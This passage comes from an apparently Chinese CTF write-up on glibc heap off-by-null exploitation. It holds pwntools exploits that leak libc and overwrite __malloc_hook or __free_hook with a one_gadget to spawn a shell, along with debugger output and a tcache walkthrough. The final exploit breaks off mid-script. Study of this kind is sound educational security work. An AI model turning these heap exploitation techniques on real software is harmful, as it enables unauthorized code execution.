class="line"># 触发 overlap</span><br><span class="line">dele(11)</span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line">add(0x28, &apos;a&apos;)  # 1</span><br><span class="line">add(0x28, &apos;a&apos;)  # 2</span><br><span class="line">add(0x18, &apos;a&apos;)  # 3</span><br><span class="line">add(0x18, &apos;a&apos;)  # 9</span><br><span class="line">add(0x38, &apos;1&apos; * 0x30)  # 10</span><br><span class="line">add(0x38, &apos;2&apos; * 0x30)  # 11</span><br><span class="line">add(0x28, &apos;3&apos; * 0x30)  # 12</span><br><span class="line">add(0x38, &apos;4&apos; * 0x30)  # 13</span><br><span class="line">add(0x38, &apos;5&apos; * 0x30)  # 14</span><br><span class="line">pay = &apos;a&apos; * 0x20 + p64(0x200) + p64(0x20)</span><br><span class="line">add(0x38, pay)  # 15</span><br><span class="line"></span><br><span class="line">add(0x38, &apos;end&apos;)  # 16</span><br><span class="line"></span><br><span class="line"># 此时会有 指针交叉</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(1)</span><br><span class="line">dele(2)</span><br><span class="line">dele(3)</span><br><span class="line">for i in range(9, 16):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line">### 构造好 unsorted bin ，下面通过不断切割，让指针落入 overlap chunk 里面， 然后 Puts leak 出来</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(0)</span><br><span class="line">pay = &apos;a&apos; * 0x38</span><br><span class="line">add(0x38, pay)  # 0</span><br><span class="line"></span><br><span class="line">###  再次 shrink chunk</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x38, &apos;a&apos; * 8)  # 1</span><br><span class="line">add(0x38, &apos;b&apos; * 8)  # 2</span><br><span class="line">add(0x38, &apos;c&apos; * 8)  # 3</span><br><span class="line"></span><br><span class="line">view(4)</span><br><span class="line">p.recvuntil(&apos;Content: &apos;)</span><br><span class="line">lbase = u64(p.recvuntil(&apos;\n&apos;)[:-1].ljust(8, &apos;\x00&apos;)) - 0x3c4b20 - 88</span><br><span class="line">success(&apos;lbase: &apos; + hex(lbase))</span><br><span class="line"></span><br><span class="line">dele(1)</span><br><span class="line">dele(2)</span><br><span class="line">dele(3)</span><br><span class="line">triger_consolidate()</span><br><span class="line"></span><br><span class="line">### 让 heap 回到 shrink chunk 后的情况</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">32: 0x0</span><br><span class="line">48: 0x0</span><br><span class="line">64: 0x0</span><br><span class="line">80: 0x0</span><br><span class="line">96: 0x0</span><br><span class="line">112: 0x0</span><br><span class="line">128: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">512: 0x603040 —▸ 0x2aaaab097d68 (main_arena+584) ◂— 0x603040 /* u&apos;@0`&apos; */</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/4xg 0x603040</span><br><span class="line">0x603040:       0x6161616161616161      0x0000000000000201</span><br><span class="line">0x603050:       0x00002aaaab097d68      0x00002aaaab097d68</span><br><span class="line">pwndbg&gt;</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">add(0x18, &apos;A&apos; * 0x10)  # 1</span><br><span class="line">add(0x28, &apos;B&apos; * 0x20)  # 2</span><br><span class="line">add(0x38, &apos;C&apos; * 0x30)  # 3</span><br><span class="line">add(0x18, &apos;D&apos; * 0x10)  # 9</span><br><span class="line"></span><br><span class="line">pay = p64(0) + p64(0x41)</span><br><span class="line">add(0x18, pay)  # 6</span><br><span class="line">add(0x28, &apos;asd&apos;)</span><br><span class="line">add(0x38, &apos;zxc&apos;)  # 5,c</span><br><span class="line">add(0x28, &apos;qqq&apos;)  # 6,d</span><br><span class="line"></span><br><span class="line">add(0x38, &apos;a1&apos;)  # 14</span><br><span class="line">add(0x28, &apos;a2&apos;)  # 15</span><br><span class="line"></span><br><span class="line"># fastbin dup, 利用 overlap chunk 和 fastbin 的机制往  main_arena 写 size 0x41</span><br><span class="line"># 然后利用 fastbin attack 控制 main_arena-&gt;top.</span><br><span class="line">dele(5)</span><br><span class="line">dele(14)</span><br><span class="line">dele(0xc)</span><br><span class="line"></span><br><span class="line">dele(6)</span><br><span class="line">dele(15)</span><br><span class="line">dele(0xd)</span><br><span class="line"></span><br><span class="line">add(0x28, p64(0x41))</span><br><span class="line">add(0x28, &apos;a&apos;)</span><br><span class="line">add(0x28, &apos;a&apos;)</span><br><span class="line"></span><br><span class="line">add(0x38, p64(lbase + 0x3c4b20 + 8))</span><br><span class="line">add(0x38, &apos;a&apos;)</span><br><span class="line">add(0x38, &apos;a&apos;)</span><br><span class="line">add(0x38, p64(lbase + 0x3c4b20 + 8 + 0x20) + &apos;\x00&apos; * 0x10 + p64(0x41))</span><br><span class="line">add(0x38, &apos;\x00&apos; * 0x20 + p64(lbase + libc.sym[&apos;__malloc_hook&apos;] - 0x18))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 把 unsorted bin 分配掉</span><br><span class="line">add(0x18, &apos;a&apos; * 0x18)</span><br><span class="line"></span><br><span class="line"># 使用 top_chunk 分配，此时 top_chunk 位于 malloc_hook 上方， 修改 malloc_hook</span><br><span class="line">add(0x18, p64(lbase + 0xf02a4) * 2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># gdb.attach(p)</span><br><span class="line"># pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 此时 chunk 6 和 chunk 8 在 tbl 的指针一样，触发 double free</span><br><span class="line"># malloc_printerr ---&gt; malloc_hook ---&gt; getshell</span><br><span class="line">dele(6)</span><br><span class="line">dele(8)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line"> [DEBUG] Received 0x5b bytes:</span><br><span class="line">    &quot;*** Error in `heapstrom_zero&apos;: double free or corruption (fasttop): 0x0000000000603200 ***\n&quot;</span><br><span class="line">*** Error in `heapstrom_zero&apos;: double free or corruption (fasttop): 0x0000000000603200 ***</span><br><span class="line">$ id</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;id\n&apos;</span><br><span class="line">[DEBUG] Received 0x84 bytes:</span><br><span class="line">    00000000  75 69 64 3d  31 30 30 30  28 6a 69 6e  67 29 20 67  │uid=│1000│(jin│g) g│</span><br><span class="line">    00000010  69 64 3d 31  30 30 30 28  6a 69 6e 67  29 20 e7 bb  │id=1│000(│jing│) ··│</span><br><span class="line">    00000020  84 3d 31 30  30 30 28 6a  69 6e 67 29  2c 34 28 61  │·=10│00(j│ing)│,4(a│</span><br><span class="line">    00000030  64 6d 29 2c  32 34 28 63  64 72 6f 6d  29 2c 32 37  │dm),│24(c│drom│),27│</span><br><span class="line">    00000040  28 73 75 64  6f 29 2c 33  30 28 64 69  70 29 2c 34  │(sud│o),3│0(di│p),4│</span><br><span class="line">    00000050  36 28 70 6c  75 67 64 65  76 29 2c 31  31 33 28 6c  │6(pl│ugde│v),1│13(l│</span><br><span class="line">    00000060  70 61 64 6d  69 6e 29 2c  31 32 38 28  73 61 6d 62  │padm│in),│128(│samb│</span><br><span class="line">    00000070  61 73 68 61  72 65 29 2c  39 39 39 28  64 6f 63 6b  │asha│re),│999(│dock│</span><br><span class="line">    00000080  65 72 29 0a                                         │er)·││</span><br><span class="line">    00000084</span><br><span class="line">uid=1000(jing) gid=1000(jing) 组=1000(jing),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(docker)</span><br></pre></td></tr></table></figure><h2 id="另一种布局"><a href="#另一种布局" class="headerlink" title="另一种布局"></a>另一种布局</h2><p>为进一步理解 off by null , 下面以另一个 exp 的信息泄露过程为例介绍下堆的布局</p><p>来源 <a href="https://xz.aliyun.com/t/3253#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/3253#toc-2</a><br>首先分配若干个 chunk , 释放掉其中的第一个 chunk ，利用 scanf 触发堆合并构造 smallbin<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"AAA\n"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">    add(<span class="number">0x38</span>, <span class="string">"A"</span> * <span class="number">8</span> + str(i) + <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发堆合并， 构造 2 个 ， smallbin</span></span><br><span class="line">sla(<span class="string">"Choice:"</span>, <span class="string">"1"</span> * <span class="number">0x500</span>)</span><br></pre></td></tr></table></figure></p><p>此时 chunk 10 的 pre_size 为 0x180 , pre_inused = 0.</p><p><img alt="" data-src="/imgs/off-by-null-5.png" class="lozad"><br>图中颜色定义如下<br><img alt="" data-src="/imgs/off-by-null-6.png" class="lozad"></p><p>然后分配一个 0x40 的 chunk , 此时会用 0x180 大小的 smallbin 分配，分配后应该剩下 0x140 大小的 unsorted bin (bin 切割后会保存在 unsorted bin ) , 然后利用 off by null , 修改 unsorted bin 的大小为 0x100. 此时会出现 0x40 的空隙。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 分配比较大的内存，使用较大的 smallbin , 分配完后利用 off by null</span></span><br><span class="line"><span class="comment"># shrink unsorted bin 的大小</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"B"</span> * <span class="number">0x30</span> + p64(<span class="number">0x120</span>))</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/imgs/off-by-null-7.png" class="lozad"></p><p>下面在分配两个 chunk (4 5) , 然后释放 chunk 4 , 在利用 堆合并 将 fastbin 放入 smallbin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 构造 smallbin 为 合并时的 unlink 做准备</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"C"</span> * <span class="number">0x30</span> + p32(<span class="number">0x40</span>) + <span class="string">'\n'</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"P"</span> * <span class="number">0x30</span> + <span class="string">'\n'</span>)  <span class="comment"># 5</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># 触发堆合并，形成 smallbin</span></span><br><span class="line">sla(<span class="string">"Choice:"</span>, <span class="string">"1"</span> * <span class="number">0x500</span>)</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/imgs/off-by-null-8.png" class="lozad"></p><p>然后把 chunk 10 释放掉， 此时系统根据 chunk 10 的 pre_size 找到 smallbin 的位置进行合并， 由于 smallbin 此时已经在链表中，所以可以成功完成合并过程中的 unlink 操作， 然后会得到一个很大的 smallbin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 释放 chunk 10, 同时触发堆合并，形成 overlap chunk , 测试 chunk 5 被 overlap</span></span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">sla(<span class="string">"Choice:"</span>, <span class="string">"1"</span> * <span class="number">0x500</span>)</span><br></pre></td></tr></table></figure><p>此时的内存布局如下图<br><img alt="" data-src="/imgs/off-by-null-9.png" class="lozad"></p><p>通过合并我们得到了一个 0x180 大小的 smallbin , 在这个大 smallbin 里面有一个还在使用的 chunk 5 , 同时还有之前分配剩下的 0x80 大小的 smallbin. 这样我就得到了 overlap heap.</p><p>下面新建 3 个 chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>, <span class="string">"DDD\n"</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"KKK\n"</span>)  <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"EEE\n"</span>)  <span class="comment"># 7</span></span><br></pre></td></tr></table></figure><p>由于malloc 分配内存的机制，会先从 0x80 的 smallbin 里面分配，然后才会去 0x180 的 smallbin 分配，所以内存布局如图。</p><p><img alt="" data-src="/imgs/off-by-null-10.png" class="lozad"></p><p>分配完成后 chunk 5 变成了 0x140 大小的 unsorted bin 的起始位置，于是可以利用 Puts 功能把 unsorted bin 的 指针打印出来， leak libc</p><h2 id="Tcache下的利用"><a href="#Tcache下的利用" class="headerlink" title="Tcache下的利用"></a>Tcache下的利用</h2><p>这是 lctf 的 easyheap , 用的是 libc 2.27 , 已经使用了 tcache</p><p>题目地址:<br><a href="https://gitee.com/hac425/blog_data/blob/master/off_by_null/easy_heap" target="_blank" rel="noopener">https://gitee.com/hac425/blog_data/blob/master/off_by_null/easy_heap</a> </p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>程序逻辑比较简单，漏洞位于 分配内存后，写内存时，如果 设置要 size 为 0xf8 就会 在 buf[0xf8] 写入一个字节。而 buf 是 0xf8 大小， 会有一字节的溢出。</p><p><img alt="" data-src="/imgs/off-by-null-11.png" class="lozad"></p><h3 id="利用分析-1"><a href="#利用分析-1" class="headerlink" title="利用分析"></a>利用分析</h3><p>由于有 tcache 的存在利用 off by null 基本不可能，所以 off by null 要想办法去溢出 非 tcache bin 和 fastbin .</p><p>每个 tcache 最多 7 个 chunk , 所以可以先填满 7 个 chunk 到 tcache 后续的 chunk 就会进入 unsorted bin 里面了。</p><p>首先分配 10 个 chunk , 释放掉后面 7 个这7 个进入 tcache , 然后释放 前面 3 个，这3 个会进入 unsorted bin , 这个过程会在 chunk 2 的 pre_size 写入 0x200.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    malloc(<span class="number">1</span>, str(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先释放后面的 chunk 填满 tcahe</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">10</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后释放前面的 3 个， 这三个会形成一个 0x300 的 unsorted bin</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#  chunk 1 的 pre_size 为 0x100</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk 2 的 pre_size 为 0x200</span></span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>此时的内存布局为</p><p><img alt="" data-src="/imgs/off-by-null-12.png" class="lozad"></p><p>接下来利用 off by null 构造 overlap chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># chunk 7 进入 unsorted bin</span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># 此时的分配会从 tcache 里面拿 chunk</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次 free chunk 8, 此时 tcache 没满，进入 tcache</span></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这时分配到的是 chunk 8 位于索引 1</span></span><br><span class="line"><span class="comment"># 因为 chunk 是 tcache 的第一项， 然后利用 off by null 修改 chunk 9 的 pre_inused = 0</span></span><br><span class="line">malloc(<span class="number">0xf8</span>, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># free 0 填充 tcache</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 释放 chunk 9 ，触发堆合并，形成 overlap chunk</span></span><br><span class="line">free(<span class="number">9</span>)</span><br></pre></td></tr></table></figure><ul><li>首先 释放 chunk 7 , 它会进入 unsorted bin， 设它为 C .</li><li>然后分配一个 chunk 0, 消耗一个 tcache, 为后面做准备。</li><li>然后释放 chunk 8 , 此时 tcache 还有一个空位，会进入 tcache 设它为 B. 再次分配 chunk ,此时会再次拿到 刚刚释放的 B ,保存在 索引 1 （以后称它为 chunk 1）的位置， 然后利用 off by null 修改 chunk 9 的 pre_inused = 0</li><li>然后释放 chunk 9 , 由于 pre_size 和 pre_inused ，系统会找到 C , 然后把 C unlink , 由于此时 C 在 unsorted bin 链表上，会 正常 unlink , 之后形成一个 0x300 的 unsorted bin , 里面包含了 还在使用状态的 B</li></ul><p><img alt="" data-src="/imgs/off-by-null-13.png" class="lozad"></p><p>下面利用 unsorted bin 的切割机制，让指针落入 chunk 1 ， 然后利用 Puts 打印出来， leak libc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 把剩下的 tcache 里面的 bin 消耗掉</span><br><span class="line">for i in range(7):</span><br><span class="line">    malloc(8, &apos;/bin/sh&apos;)</span><br><span class="line"></span><br><span class="line"># 分配一个chunk 此时 索引 1 的 chunk 指向 unsorted bin , leak</span><br><span class="line">malloc(1, &apos;8&apos;)</span><br></pre></td></tr></table></figure><p>首先把 tcache 使用掉，然后分配一个 chunk ,此时 chunk 1 会变成 unsorted bin 的起始地址。</p><p>然后打印 chunk 1 的内容，拿到 libc 的地址。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">leak = puts(<span class="number">1</span>)</span><br><span class="line">libc.address = leak - libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x70</span></span><br><span class="line">info(<span class="string">"libc.address : "</span> + hex(libc.address))</span><br></pre></td></tr></table></figure></p><p>下面利用 tcache 的机制, 让两个 一样的 bin 链入 tcache ，为后续做准备。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 分配到 chunk 1, 此时 索引为 9， 现在 索引 1， 9 指向同一个 chunk</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'9'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此时 tcache 中为两个 一样的 chunk 链在了一起, 设这个 chunk 的名称为 A。</span></span><br><span class="line">free(<span class="number">0</span>)  <span class="comment"># 为了给后续申请腾出空间</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br></pre></td></tr></table></figure><ul><li>首先分配一 个 chunk , 这时 索引 1， 9 指向同一个 chunk，设这个 chunk 的名称为 A。</li><li>然后连续释放 1 和 9 ， 此时 tcache 里面会有两个 A .</li></ul><p><img alt="" data-src="/imgs/off-by-null-14.png" class="lozad"></p><p>然后在通过修改 tcache 的指针实现分配到 __free_hook, 修改 free_hook 为 one_gadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 分配到 tcache中的第一个 A ，此时 A 还位于 tcache, 然后修改 A-&gt;fd 为 free_hook</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次分配到 A</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配到 free_hook, 然后修改 free_hook 为 system</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(one_gadget))</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/imgs/off-by-null-15.png" class="lozad"><br>最后触发 free , 调用 one_gadget ，拿到 shell.</p><p>完整exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="comment"># context.terminal = ['tmux', 'splitw', '-v']</span></span><br><span class="line"></span><br><span class="line">path = <span class="string">"easy_heap"</span></span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">bin = ELF(path)</span><br><span class="line"></span><br><span class="line">p = process(path, aslr=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size, data)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'command?'</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'size'</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">'content'</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'command?'</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index'</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'command?'</span>, <span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index'</span>, str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    <span class="keyword">return</span> u64((p.recvline()[:<span class="number">-1</span>]).ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    malloc(<span class="number">1</span>, str(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先释放后面的 chunk 填满 tcahe</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">10</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后释放前面的 3 个， 这三个会形成一个 0x300 的 unsorted bin</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#  chunk 1 的 pre_size 为 0x100</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk 2 的 pre_size 为 0x200</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 tcache 分配</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    malloc(<span class="number">1</span>, str(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配 unsorted bin</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'7'</span>)</span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'8'</span>)</span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'9'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次让 chunk 回到 tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk 7 进入 unsorted bin</span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># 此时的分配会从 tcache 里面拿 chunk</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次 free chunk 8, 此时 tcache 没满，进入 tcache</span></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这时分配到的是 chunk 8 位于索引 